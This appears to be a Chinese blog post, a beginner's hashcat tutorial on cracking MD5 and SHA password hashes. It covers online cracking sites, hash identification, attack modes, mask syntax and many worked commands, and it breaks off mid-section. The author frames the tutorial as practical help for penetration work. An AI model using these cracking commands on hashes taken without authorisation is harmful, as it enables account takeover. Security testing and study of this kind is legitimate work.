<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>To change is to be better to change often is to change perfect</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
    <meta name="google-site-verification" content="zeeMq378QFdIk20wn4KhRFwp7IhLaosjf7Kf7o9Zcfs" />
  
  
  
  <meta name="description" content="JoeJoeyMA Blog">
<meta property="og:type" content="website">
<meta property="og:title" content="To change is to be better to change often is to change perfect">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="To change is to be better to change often is to change perfect">
<meta property="og:description" content="JoeJoeyMA Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="To change is to be better to change often is to change perfect">
<meta name="twitter:description" content="JoeJoeyMA Blog">
  
    <link rel="alternate" href="/atom.xml" title="To change is to be better to change often is to change perfect" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/home.css" >
  

  

  

  
  
  

</head>



  <body>


  
    <header id="header">
<!--
                              _.._        ,-------------------.
                           ,'      `.    ( Do you have offer? )
                          /  __) __` \    `-,----------------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          ( contact ",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  Email@:joejoey.ma@gmail.com
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
	<!-- 背景图模式 -->
	

    
      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">

      <!-- Support rolling -->  
        
        <section class="awSlider">
          <div class="carousel slide carousel-fade " data-ride="carousel">

            <!-- Wrapper for slides -->
            <div class="carousel-inner">
               
                  
                    <div class="item active">
                  
                    <img id="carousel-img0" src="https://bing.ioliu.cn/v1">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img0 = new Image();
                      var imageTag0 = document.getElementById("carousel-img0");
                      img0.src = imageTag0.src;
                      img0.onload=function(){
                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag0.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag0.style.height = document.body.clientHeight + "px";
                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img1" src="https://bing.ioliu.cn/v1/rand">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img1 = new Image();
                      var imageTag1 = document.getElementById("carousel-img1");
                      img1.src = imageTag1.src;
                      img1.onload=function(){
                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag1.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag1.style.height = document.body.clientHeight + "px";
                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img2" src="/css/images/home-bg.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img2 = new Image();
                      var imageTag2 = document.getElementById("carousel-img2");
                      img2.src = imageTag2.src;
                      img2.onload=function(){
                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag2.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag2.style.height = document.body.clientHeight + "px";
                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img3" src="https://source.unsplash.com/collection/954550/1920x1080">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img3 = new Image();
                      var imageTag3 = document.getElementById("carousel-img3");
                      img3.src = imageTag3.src;
                      img3.onload=function(){
                        if (img3.width / img3.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag3.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag3.style.height = document.body.clientHeight + "px";
                          imageTag3.style.marginLeft = -(document.body.clientHeight * img3.width / img3.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img4" src="/css/images/sample.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img4 = new Image();
                      var imageTag4 = document.getElementById("carousel-img4");
                      img4.src = imageTag4.src;
                      img4.onload=function(){
                        if (img4.width / img4.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag4.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag4.style.height = document.body.clientHeight + "px";
                          imageTag4.style.marginLeft = -(document.body.clientHeight * img4.width / img4.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img5" src="/css/images/2.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img5 = new Image();
                      var imageTag5 = document.getElementById("carousel-img5");
                      img5.src = imageTag5.src;
                      img5.onload=function(){
                        if (img5.width / img5.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag5.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag5.style.height = document.body.clientHeight + "px";
                          imageTag5.style.marginLeft = -(document.body.clientHeight * img5.width / img5.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
            </div>

            <!-- Controls -->
            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
              <span class="sr-only">Geri</span>
            </a>
            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
              <span class="sr-only">İleri</span>
            </a>
          </div>
        </section>
        <script>
          $('section.awSlider .carousel').carousel({
              pause: '',
              interval: 10000
          });
          var startImage = $('section.awSlider .item.active > img').attr('src');
          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
              var bscn = $(this).find('.item.active > img').attr('src');
              $('section.awSlider > img').attr('src', bscn);
          });
        </script>
      

    
 


    <canvas width="100%" height="100%"></canvas>
    <script>
      var c = document.getElementsByTagName('canvas')[0],
          x = c.getContext('2d'),
          w = window.innerWidth,
          h = window.innerHeight,
          pr = window.devicePixelRatio || 1,
          f = 90,
          q,
          m = Math,
          r = 0,
          u = m.PI*2,
          v = m.cos,
          z = m.random
      c.width = w*pr
      c.height = h*pr
      x.scale(pr, pr)
      x.globalAlpha = 0.6

      <!-- 折线Polyline背景 -->
      
    </script>
    

    
      <div id="homelogo" class="homelogo" style="background: none;"> 
    

        
          <div class="homelogoback"  style="border: 0px solid #404040;" >
            <h1><a href="#content" id="logo">To change is to be better to change often is to change perfect</a></h1>
            <h3>JoeJoeyMA Blog</h3>
            <h5></h5>
            <!-- <p><a href="https://github.com/JoeJoeyMa/JoeJoeyMa.github.io" target="_blank">Github</a></p> -->
          </div>
        
    
    </div>
  </div>

  <!-- 自适应主页背景大图 -->
  

 <!-- home_logo_image居中 -->
 
    <script>
        var homelogodiv = document.getElementById("homelogo");
        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
          homelogodiv.style.width = document.body.clientWidth + "px";
          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
        } else {
          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
        }
    </script>
  

  <div class="intro-navigate">
      <p class="navigater-list">
        
          <a id="beautifont" class="main-nav-link" href="/">Startseite</a>
        
          <a id="beautifont" class="main-nav-link" href="/archives">Archive</a>
        
          <a id="beautifont" class="main-nav-link" href="/categories">about themes</a>
        
          <a id="beautifont" class="main-nav-link" href="/tags">Tags</a>
        
          <a id="beautifont" class="main-nav-link" href="/about">About</a>
        
          <a id="beautifont" class="main-nav-link" href="/book">📓</a>
        
      </p>
  </div>

</header>
  
  <div id="container">
    <div id="wrap">
      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;">
  
    <article id="post-快速破解各种散列hash [ hashcat入门篇 ]"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/04/24/快速破解各种散列hash [ hashcat入门篇 ]/">快速破解各种散列hash [ hashcat入门篇 ]</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/04/24/快速破解各种散列hash [ hashcat入门篇 ]/" class="article-date">
	  <time datetime="2018-04-24T04:43:05.000Z" itemprop="datePublished">2018-04-24</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>Hase</li>
<li>MD5</li>
<li></li>
</ul>
<p>0x00 前言<br>    最近恰巧刚搞到一批hash,所以就寻思着,要不顺手小结一点关于hash破解的东西吧,反正经常要用,就当留备忘了,顺便也分享给大家,主要还是希望大家都能在实际渗透中能尽快上手用,既是这样,就肯定不会涉及太深,比如,其内部的破解算法具体是如何实现的等…,我们都不会去深入剖析,毕竟,并不是为了去写此类工具,如果真的有兴趣,可自行去读源码[ 起码自己暂时还没那能力 ],经常渗透的朋友可能都非常清楚,由于各种各样的途径,我们经常会搞到各种各样的散列[ hash ],比如,各类web管理用户的密码hash,各类系统用户的密码hash,各种第三方服务器工具配置文件中的hash,各类办公套件文件启动密码的加密hash,等…今天,我们就来简要说明一下关于各类hash破解工具的使用,以备不时之需…其实,明眼人都很清楚,hash破解本质是没啥实际技术含量的[ 前提你自己不写此类工具 ],还是那句话,主要目的还是希望大家能尽快上手,既然是好东西就要想办法把它应用到实际干活儿中,不然,意义何在呢…废话少说,咱们开始介绍今天的第一款hash破解工具,hashcat想必该工具早已家喻户晓[ 关于hash破解的东西,后续我会做成一个单独的系列 ],希望大家能持续关注,你们的支持,会是自己努力创作的源泉,嘿嘿…</p>
<p>0x01 先介绍几个相对比较好用的在线hash破解站,其实,诸如此类的站点非常多,不过大多都不太靠谱,后期遇到好的我会再贴上来</p>
<p>算是国内比较知名的在线hash破解站,虽然目前支持的散列类型还比较少,不过就成功率来讲,还行吧,在你自己没有特别好的显卡,GPU矩阵或者性能强劲的CPU的时候,它无疑是个很好的替代品,实在没查到,起码还可以在后台帮你跑五天,先不管能不能跑出来,总归是个希望</p>
<p>1<br>cmd5.com<br>如果cmd5实在跑不出来,不妨再尝试它,也是个比较老的在线hash破解站了,估计朋友们也都比较熟悉,这里就不啰嗦了</p>
<p>1<br><a href="http://www.objectif-securite.ch" target="_blank" rel="noopener">www.objectif-securite.ch</a><br>另外,在淘宝上也有很多提供这种hash爆破服务的卖家,实在不行还可以尝试直接丢给他们跑,一般跑出来才会让你付钱,其实说白点儿,他们可能也是在后台拿GPU矩阵跑的,需要注意的是,找个靠谱点儿的店就好了,某宝骗子多,形形色色,有些东西总让人防不胜防</p>
<p>1<br>淘宝<br>最后,在kali中也自带了一个在线的hash破解脚本findmyhash,其实,脚本做的事情非常low,就是轮询着把你提供的hash丢到各个hash破解站上去查询,如果查到了就把对应的结果明文发回来,实在不行,还可以丢到谷歌上跑跑,仅此而已,可能唯一要注意的是先把kali挂上vpn,不然,有些站点可能访问不了,说实话,基本就是个废除了最普通的md5,别的就算了吧,实在没办法,碰碰运气还是可以的</p>
<p>1</p>
<h1 id="findmyhash-md5-h-ff9830c42660c1dd1942844f8069b74a"><a href="#findmyhash-md5-h-ff9830c42660c1dd1942844f8069b74a" class="headerlink" title="findmyhash md5 -h ff9830c42660c1dd1942844f8069b74a"></a>findmyhash md5 -h ff9830c42660c1dd1942844f8069b74a</h1><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/findmyhash.png">
<p>0x02 识别hash类型</p>
<p>如果你实在搞不清楚某条hash的具体散列类型,不妨先用下面的脚本[kali自带]大致识别下,可能不太准,不过粗略的看一眼还是可以的,另外,谷歌上也有很多在线的hash类型识别站,可自行去尝试,这里就不一一列举了<br>hash-identifier.png<br><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/hash-identifier.png"></p>
<p>1</p>
<h1 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h1><p>0x03 使用hashcat前的一点点准备工作</p>
<p>务必保证已经事先装好对应的显卡驱动看官网这情况,最新版的hashcat除了增加了一些新的散列类型之外,貌似也已经不再区分AMD和英伟达显卡了,如果你用的是旧版本的hashcat,请根据自己实际的显卡类型来选择对应版本的hashcat,之后再到其官方站点把hashcat down下来,注意,直接解压即可运行,无需再额外装任何东西,用什么系统就运行对应系统的可执行程序即可实际破解中,更推荐用linux,可能就是装驱动稍微有点儿麻烦,不过还好啦,如果实在搞不定,在win下跑也是一样的,本来想用显卡给大家演示的,没办法,家里的电脑,集成显卡没钱,无奈,大家谅解哈,所以,下面就直接全部用kali自带的hashcat来演示了,不同类型的hashcat,单就用法来讲,其实也没啥太大区别,实际使用中建议还是自己买块好点儿的显卡跑,如果真有条件很显然,本人是个穷逼GPU矩阵也是可以考虑的</p>
<p>1<br><a href="https://hashcat.net/files/hashcat-3.6.0.7z" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-3.6.0.7z</a><br>0x04 关于hashcat的一些常用选项</p>
<p>如果在kali中提示要升级到新版本[kali2.x可能会出现这样的情况],请把系统时间修改到2010年之前即可,这里就只说几个最常用的选项,关于其它的各种小选项,因为自己实际中用的比较少,如果大家万一用到,扫一眼帮助即可,篇幅原因这里就只捡最核心的说了</p>
<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>-a  指定要使用的破解模式<br>-m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法<br>-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中<br>–force    忽略破解过程中的警告信息,跑单条hash可能需要加上此选项<br>–show    显示已经破解的hash及该hash所对应的明文<br>–increment     启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长<br>–increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用<br>–increment-max  密码最大长度,同上<br>–outfile-format 指定破解结果的输出格式id,一般自己常用3<br>–username      忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到<br>–remove      删除已被破解成功的hash<br>-r         使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的<br>0x05 hashcat 不同破解模式下的具体工作细节:</p>
<p>最简单的纯粹基于字典的爆破模式,后面可以连续跟上多个字典文件,破解的成功与否最终还是取决于字典质量,在几乎同等的破解时间里,是我我肯定不会先选它的,简单跑一些弱口令什么的,还是可以的,话说回来,如果只是跑些弱口令,大可不用hashcat,未免有些大材小用了,不是吗</p>
<p>1<br>0 | Straight<br>一种相对智能高效的爆破模式,它的意思是这样的,如果你事先已经明确知道密码中可能包含哪些字符串,你可以把那些字符串事先写到文件中,每行对应一个字符串,然后hashcat会自动根据你所提供的这些字符串,尝试所有可能的组合进行猜解</p>
<p>1<br>1 | Combination<br>基于纯掩码的爆破方式,如果你有需求要大批量爆破hash,可能会用到,后面我们会用绝大部分的篇幅来说它,这里需要稍微注意下,你给定的掩码是多少位它就只破解多少位,比如,你给的是7位的掩码,它就只跑7位这么长,它可能并不是你想象的那样,是从1位一直跑到第7位这样自动轮询,如果你想让它自动变长跑,启用increment模式指定密码的最小和最大长度即可,之前理解的有点儿错,也是看官方的wiki才知道的,汗…</p>
<p>1<br>3 | Brute-force<br>基于字典和掩码配合的爆破模式,它的破解过程其实也比较简单,就是每次从前面的字典中取出一个字符串然后和后面掩码的所有组合进行拼接,直到撞到对应的明文</p>
<p>1<br>6 | Hybrid Wordlist + Mask<br>基于掩码和字典配合的爆破模式,跟6的过程正好相反,只不过这次它是从前面进行拼接</p>
<p>1<br>7 | Hybrid Mask + Wordlist<br>0x06 hashcat 不同的掩码所表示的具体字符及掩码字符集规则使用样例:</p>
<p>掩码是个非常灵活的东西,你可以把它放到任何你想放的位置上,甚至,你愿意的话,也可以把自己想跑的一些掩码规则都事先放到一个文件中,然后以.hcmask命名,加载就可以让hashcat自动跑了,这样用起来比较方便,省的后期经常需要人为干预,后续会为大家简单演示下</p>
<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>l | abcdefghijklmnopqrstuvwxyz            纯小写字母<br>u | ABCDEFGHIJKLMNOPQRSTUVWXYZ            纯大写字母<br>d | 0123456789                    纯数字<br>h | 0123456789abcdef                常见小写子目录和数字<br>H | 0123456789ABCDEF                常见大写字母和数字<br>s |  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~        特殊字符<br>a | ?l?u?d?s                    以上所有字符<br>b | 0x00 - 0xff                    可能是用来匹配像空格这种密码的<br>比如,下面的例子:</p>
<p>1<br>2<br>?l?l?l?l?l?l?d?d?d?d  表示6位小写子目录4位数字组成的密码,注意这里的位置全部都是一一对应的<br>de?l?d?s56pos 表示由de加一位小写字母加一位数字加一位特殊字符后面跟上56pos组成的密码<br>当然,你也可以自定义字符集规则,注意,可以连续指定多个不同的规则集</p>
<p>1<br>2<br>3<br>4<br>-1, –custom-charset1   | CS   | User-defined charset ?1   | -1 ?l?d?u<br>-2, –custom-charset2   | CS   | User-defined charset ?2   | -2 ?l?d?s<br>-3, –custom-charset3   | CS   | User-defined charset ?3   |<br>-4, –custom-charset4   | CS   | User-defined charset ?4<br>比如,下面的例子:</p>
<p>1<br>2<br>-1 ?l?s    ?1?1?1?1?1     表示五位由特殊字符和小写字母组成的密码<br>-1 ?d?l    -2 ?d?l?u -3 ?l?u ?1?2?3    表示密码的第一位可能是小写字母或者数字,第二位可能是大小写字母或者数字,第三位可能是大或小写字母<br>0x07 不同破解模式下的具体应用场景,用的时候需要稍微注意下语句格式(暂以破解最普通的md5 hash为例)</p>
<p>基于纯字典的爆破模式 Straight:</p>
<p>1<br>2</p>
<h1 id="hashcat-–force-a-0-m-0-hash-txt-home-weak-wordlist-pass-weakpass-txt-o-res-txt"><a href="#hashcat-–force-a-0-m-0-hash-txt-home-weak-wordlist-pass-weakpass-txt-o-res-txt" class="headerlink" title="hashcat –force -a 0 -m 0 hash.txt /home/weak_wordlist/pass/weakpass.txt -o res.txt"></a>hashcat –force -a 0 -m 0 hash.txt /home/weak_wordlist/pass/weakpass.txt -o res.txt</h1><h1 id="cat-res-txt"><a href="#cat-res-txt" class="headerlink" title="cat res.txt"></a>cat res.txt</h1><p>wordlist.png</p>
<img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/wordlist.png">
<p>稍微智能一些的字典爆破模式,需要事先把密码中有可能包含到的单词都放到字典中 Combination:</p>
<p>比如,我有两个这样的字典,字典包含如下的字符串,而我的实际密码是adminpass [ 字典文件可同时有很多个,不过那也意味你的组合也会特别多,速度就会慢 ],实际破解就可以像下面就这样写</p>
<p>1</p>
<h1 id="cat-dic1-txt-dic2-txt"><a href="#cat-dic1-txt-dic2-txt" class="headerlink" title="cat dic1.txt dic2.txt"></a>cat dic1.txt dic2.txt</h1><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/combination_dic.png">
<p>combination_dic.png<br>1</p>
<h1 id="hashcat-–force-a-1-m-0-hash-txt-dic1-txt-dic2-txt"><a href="#hashcat-–force-a-1-m-0-hash-txt-dic1-txt-dic2-txt" class="headerlink" title="hashcat –force -a 1 -m 0 hash.txt dic1.txt dic2.txt"></a>hashcat –force -a 1 -m 0 hash.txt dic1.txt dic2.txt</h1><p>combination_res.png</p>
<img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/combination_res.png">
<p>基于纯掩码的爆破模式,其实就是尝试逐个位破解,一般人的密码设置习惯大都是基于大小写字母数字这种形式的,如果hash实在比较多,可以尝试从指定的位数开始一位位的将大小写特殊字符轮询这跑,可以节省一些时间 [Brute-force]:</p>
<p>破解九位纯小写字母组成的密码hash,可以看到在我双CPU双核的虚拟机中破解这种只是两三分钟的事情</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-l-l-l-l-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-0-hash-txt-l-l-l-l-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt ?l?l?l?l?l?l?l?l?l"></a>hashcat –force -a 3 -m 0 hash.txt ?l?l?l?l?l?l?l?l?l</h1><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/brute-force-9l.png">
<p>前三位小写字母,后四位数字</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-l-l-l-d-d-d-d"><a href="#hashcat-–force-a-3-m-0-hash-txt-l-l-l-d-d-d-d" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt ?l?l?l?d?d?d?d"></a>hashcat –force -a 3 -m 0 hash.txt ?l?l?l?d?d?d?d</h1><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/brute-force-3l4d.png">
<p>10位纯数字,其实大家都很清楚,底层对数字的处理速度是最快的<br><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/brute-force-10d.png"><br>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-d-d-d-d-d-d-d-d-d-d"><a href="#hashcat-–force-a-3-m-0-hash-txt-d-d-d-d-d-d-d-d-d-d" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d?d?d"></a>hashcat –force -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d?d?d</h1><p>7位小写字母加数字的随机组合<br>brute-force-71.png<br><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/brute-force-71.png"><br>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-1-l-d-1-1-1-1-1-1-1"><a href="#hashcat-–force-a-3-m-0-hash-txt-1-l-d-1-1-1-1-1-1-1" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt -1 ?l?d ?1?1?1?1?1?1?1"></a>hashcat –force -a 3 -m 0 hash.txt -1 ?l?d ?1?1?1?1?1?1?1</h1><p>除了上面这种常规的掩码写法,你也可以这样,比如,你明确的知道密码的某一位或者几位上可能是什么字符,你也可以这样写掩码,假设密码明文为loveshare,你实际破解的掩码就可以这样写,它只会去破解有掩码的位,速度自然就非常快了<br>brute-force-loveshare.png<br><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/brute-force-loveshare.png"></p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-l-lve-l-la-l-l"><a href="#hashcat-–force-a-3-m-0-hash-txt-l-lve-l-la-l-l" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt ?l?lve?l?la?l?l"></a>hashcat –force -a 3 -m 0 hash.txt ?l?lve?l?la?l?l</h1><p>基于字典和掩码配合的爆破模式,把可能存在的字符串事先写到字典中,然后hashcat在破解的时候会把后面所有的掩码组合跟前面的字典每行中的字符串进行拼接,直到猜解出明文,下面也是一样,只不过下面是把掩码放在了前面字典放在了后面Hybrid Wordlist + Mask,其实,它想表达的意思非常简单,如<br>hybrid wordlist + mask.png<br><img src="/2018/04/24/快速破解各种散列hash%20[%20hashcat入门篇%20]/hybrid%20wordlist%20+%20mask.png"></p>
<p>1<br>2<br>3<br>4<br>dic1.txt 中的内容是这样的<br>admin<br>root<br>….<br>实际的明文密码是这样的</p>
<p>1<br>adminpass123<br>那你实际破解的掩码,就可以这样写</p>
<p>1</p>
<h1 id="hashcat-–force-m-0-hash-txt-a-6-dic1-txt-1-l-l-1-1-1-d-d-d"><a href="#hashcat-–force-m-0-hash-txt-a-6-dic1-txt-1-l-l-1-1-1-d-d-d" class="headerlink" title="hashcat –force -m 0 hash.txt -a 6 dic1.txt -1 ?l ?l?1?1?1?d?d?d"></a>hashcat –force -m 0 hash.txt -a 6 dic1.txt -1 ?l ?l?1?1?1?d?d?d</h1><p>其实,它实际的拼接过程就相当于下面这样,直到最后就会撞到adminpass123</p>
<p>1<br>2<br>3<br>admin?l?1?1?1?d?d?d<br>pass?l?1?1?1?d?d?d<br>…<br>下面是多字典实例</p>
<p>1</p>
<h1 id="hashcat-–force-m-0-hash-txt-a-6-dic1-txt-dic2-txt-1-l-l-1-1-1-d-d-d"><a href="#hashcat-–force-m-0-hash-txt-a-6-dic1-txt-dic2-txt-1-l-l-1-1-1-d-d-d" class="headerlink" title="hashcat –force -m 0 hash.txt -a 6 dic1.txt dic2.txt -1 ?l ?l?1?1?1?d?d?d"></a>hashcat –force -m 0 hash.txt -a 6 dic1.txt dic2.txt -1 ?l ?l?1?1?1?d?d?d</h1><p>基于掩码和字典配合的爆破模式 [Hybrid Mask + Wordlist]:</p>
<p>1</p>
<h1 id="hashcat-–force-m-0-hash-txt-1-l-d-1-1-1-1-a-7-dic1-txt-dic2-txt"><a href="#hashcat-–force-m-0-hash-txt-1-l-d-1-1-1-1-a-7-dic1-txt-dic2-txt" class="headerlink" title="hashcat –force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt"></a>hashcat –force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt</h1><p>基于increment的自动变长模式,下面的意思就表示自动破解4到8位由小写子目录和数字组成的密码hash:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-–increment-–increment-min-4-–increment-max-8-1-l-d"><a href="#hashcat-–force-a-3-m-0-hash-txt-–increment-–increment-min-4-–increment-max-8-1-l-d" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt –increment –increment-min=4 –increment-max=8 -1 ?l?d"></a>hashcat –force -a 3 -m 0 hash.txt –increment –increment-min=4 –increment-max=8 -1 ?l?d</h1><p>0x08 下面是一些我们可能会经常碰到的散列掩码爆破实例,自己机器性能不是太好,为了节省时间,所以实际设置的密码都非常简单,大多是9位以内的小写字母加数字</p>
<p>破解最普通的md5 hash [可能也是大家用的最多的散列,本身并非加密算法,大多是用来做hash校验用的,除了常规网站后台管理密码,另外,很多常见服务器端工具的默认加密都是基于此类型,如,filezilla,等等…],下面表示破解8位由小写字母数字组成的密码:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-0-hash-txt-1-l-d-1-1-1-1-1-1-1-1"><a href="#hashcat-–force-a-3-m-0-hash-txt-1-l-d-1-1-1-1-1-1-1-1" class="headerlink" title="hashcat –force -a 3 -m 0 hash.txt -1 ?l?d    ?1?1?1?1?1?1?1?1"></a>hashcat –force -a 3 -m 0 hash.txt -1 ?l?d    ?1?1?1?1?1?1?1?1</h1><p>破解 sha系列 hash [绝大多数linux发行版的默认用户密码加密类型都是基于sha系列的变种]:</p>
<p>纯sha1,五位小写字母:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-100-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-100-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 100 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 100 hash.txt ?l?l?l?l?l</h1><p>纯sha224,五位小写字母:</p>
<p>1</p>
<h1 id="hashcat-–force-a-3-m-1300-hash-txt-l-l-l-l-l"><a href="#hashcat-–force-a-3-m-1300-hash-txt-l-l-l-l-l" class="headerlink" title="hashcat –force -a 3 -m 1300 hash.txt ?l?l?l?l?l"></a>hashcat –force -a 3 -m 1300 hash.txt ?l?l?l?l?l</h1><p>纯sha256,五位小写字母:</p>
<p>1</p>
